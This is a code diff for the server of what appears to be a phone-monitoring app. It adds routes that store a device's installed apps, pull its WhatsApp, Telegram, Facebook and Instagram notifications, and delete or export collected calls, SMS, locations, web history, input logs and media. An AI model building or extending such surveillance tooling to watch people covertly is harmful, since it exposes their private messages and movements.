@@ -359,4 +359,157 @@ router.get('/media/:deviceId', requireAuth, async (req: AuthRequest, res) => {
   res.json(media);
 });
 
+const installedAppsSchema = z.object({
+  apps: z.array(z.object({
+    packageName: z.string(),
+    appName: z.string().optional(),
+    versionName: z.string().optional(),
+    action: z.enum(['installed', 'removed', 'snapshot']),
+    timestamp: z.string().datetime(),
+  })),
+});
+
+router.post('/installed-apps', requireDevice, async (req: AuthRequest, res) => {
+  try {
+    const { apps } = installedAppsSchema.parse(req.body);
+    for (const app of apps) {
+      if (app.action === 'removed') {
+        await prisma.installedApp.upsert({
+          where: { deviceId_packageName: { deviceId: req.deviceId!, packageName: app.packageName } },
+          update: { isInstalled: false, updatedAt: new Date() },
+          create: { deviceId: req.deviceId!, packageName: app.packageName, appName: app.appName || app.packageName, isInstalled: false },
+        });
+      } else {
+        await prisma.installedApp.upsert({
+          where: { deviceId_packageName: { deviceId: req.deviceId!, packageName: app.packageName } },
+          update: { appName: app.appName || app.packageName, versionName: app.versionName, isInstalled: true, updatedAt: new Date() },
+          create: { deviceId: req.deviceId!, packageName: app.packageName, appName: app.appName || app.packageName, versionName: app.versionName, isInstalled: true },
+        });
+      }
+      if (app.action !== 'snapshot') {
+        await prisma.appChangeLog.create({
+          data: { deviceId: req.deviceId!, packageName: app.packageName, appName: app.appName, action: app.action, recordedAt: new Date(app.timestamp) },
+        });
+      }
+    }
+    res.json({ ok: true, count: apps.length });
+  } catch (e) {
+    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
+    console.error('installed-apps error:', e);
+    res.status(500).json({ error: 'Uygulama kaydı başarısız' });
+  }
+});
+
+router.get('/installed-apps/:deviceId', requireAuth, async (req: AuthRequest, res) => {
+  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
+  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
+  const [apps, changes] = await Promise.all([
+    prisma.installedApp.findMany({ where: { deviceId: req.params.deviceId }, orderBy: { appName: 'asc' } }),
+    prisma.appChangeLog.findMany({ where: { deviceId: req.params.deviceId }, orderBy: { recordedAt: 'desc' }, take: 100 }),
+  ]);
+  res.json({ apps, changes });
+});
+
+router.get('/social/:deviceId', requireAuth, async (req: AuthRequest, res) => {
+  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
+  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
+  const socialPackages = ['com.whatsapp', 'com.whatsapp.w4b', 'org.telegram.messenger', 'com.facebook.katana', 'com.facebook.orca', 'com.instagram.android'];
+  const notifications = await prisma.notification.findMany({
+    where: { deviceId: req.params.deviceId, appPackage: { in: socialPackages } },
+    orderBy: { timestamp: 'desc' },
+    take: 500,
+  });
+  res.json(notifications);
+});
+
+type DataType = 'calls' | 'sms' | 'notifications' | 'locations' | 'web-history' | 'input-logs' | 'media' | 'installed-apps';
+
+router.delete('/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => {
+  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
+  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
+  const type = req.params.type as DataType | 'all';
+  const deviceId = req.params.deviceId;
+
+  try {
+    if (type === 'all') {
+      await Promise.all([
+        prisma.callLog.deleteMany({ where: { deviceId } }),
+        prisma.smsMessage.deleteMany({ where: { deviceId } }),
+        prisma.notification.deleteMany({ where: { deviceId } }),
+        prisma.location.deleteMany({ where: { deviceId } }),
+        prisma.webHistory.deleteMany({ where: { deviceId } }),
+        prisma.inputLog.deleteMany({ where: { deviceId } }),
+        prisma.mediaCapture.deleteMany({ where: { deviceId } }),
+        prisma.appChangeLog.deleteMany({ where: { deviceId } }),
+        prisma.installedApp.deleteMany({ where: { deviceId } }),
+      ]);
+      return res.json({ ok: true, message: 'Tüm veriler silindi' });
+    }
+    const map: Record<string, () => Promise<unknown>> = {
+      calls: () => prisma.callLog.deleteMany({ where: { deviceId } }),
+      sms: () => prisma.smsMessage.deleteMany({ where: { deviceId } }),
+      notifications: () => prisma.notification.deleteMany({ where: { deviceId } }),
+      locations: () => prisma.location.deleteMany({ where: { deviceId } }),
+      'web-history': () => prisma.webHistory.deleteMany({ where: { deviceId } }),
+      'input-logs': () => prisma.inputLog.deleteMany({ where: { deviceId } }),
+      media: () => prisma.mediaCapture.deleteMany({ where: { deviceId } }),
+      'installed-apps': () => Promise.all([
+        prisma.installedApp.deleteMany({ where: { deviceId } }),
+        prisma.appChangeLog.deleteMany({ where: { deviceId } }),
+      ]),
+    };
+    const fn = map[type];
+    if (!fn) return res.status(400).json({ error: 'Geçersiz veri tipi' });
+    await fn();
+    res.json({ ok: true });
+  } catch (e) {
+    console.error('delete error:', e);
+    res.status(500).json({ error: 'Silme başarısız' });
+  }
+});
+
+router.get('/export/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => {
+  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
+  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
+  const type = req.params.type as DataType | 'all';
+  const deviceId = req.params.deviceId;
+
+  try {
+    let data: unknown;
+    if (type === 'all') {
+      data = {
+        calls: await prisma.callLog.findMany({ where: { deviceId } }),
+        sms: await prisma.smsMessage.findMany({ where: { deviceId } }),
+        notifications: await prisma.notification.findMany({ where: { deviceId } }),
+        locations: await prisma.location.findMany({ where: { deviceId } }),
+        webHistory: await prisma.webHistory.findMany({ where: { deviceId } }),
+        inputLogs: await prisma.inputLog.findMany({ where: { deviceId } }),
+        media: await prisma.mediaCapture.findMany({ where: { deviceId } }),
+        installedApps: await prisma.installedApp.findMany({ where: { deviceId } }),
+        appChanges: await prisma.appChangeLog.findMany({ where: { deviceId } }),
+      };
+    } else {
+      const map: Record<string, () => Promise<unknown>> = {
+        calls: () => prisma.callLog.findMany({ where: { deviceId } }),
+        sms: () => prisma.smsMessage.findMany({ where: { deviceId } }),
+        notifications: () => prisma.notification.findMany({ where: { deviceId } }),
+        locations: () => prisma.location.findMany({ where: { deviceId } }),
+        'web-history': () => prisma.webHistory.findMany({ where: { deviceId } }),
+        'input-logs': () => prisma.inputLog.findMany({ where: { deviceId } }),
+        media: () => prisma.mediaCapture.findMany({ where: { deviceId } }),
+        'installed-apps': () => prisma.installedApp.findMany({ where: { deviceId } }),
+      };
+      const fn = map[type];
+      if (!fn) return res.status(400).json({ error: 'Geçersiz veri tipi' });
+      data = await fn();
+    }
+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Content-Disposition', `attachment; filename="${type}-${deviceId}.json"`);
+    res.send(JSON.stringify(data, null, 2));
+  } catch (e) {
+    console.error('export error:', e);
+    res.status(500).json({ error: 'Dışa aktarma başarısız' });
+  }
+});
+
 export default router;
